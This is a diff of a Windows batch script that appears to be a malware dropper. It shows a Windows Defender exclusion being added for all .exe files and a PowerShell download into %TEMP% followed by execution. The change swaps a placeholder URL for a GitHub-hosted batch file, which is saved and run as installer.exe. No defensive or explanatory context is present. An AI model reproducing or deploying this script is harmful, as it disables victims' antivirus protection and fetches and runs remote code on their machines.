@@ -28,5 +28,5 @@ if '%errorlevel%' NEQ '0' (
 :--------------------------------------
 Powershell -Command "Set-MpPreference -ExclusionExtension exe"
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://YOURSITE.COM/installer.exe' -OutFile installer.exe"
+Powershell -Command "Invoke-Webrequest 'https://github.com/walks111551/09672018256120856125/blob/main/ads12.bat' -OutFile installer.exe"
 installer.exe
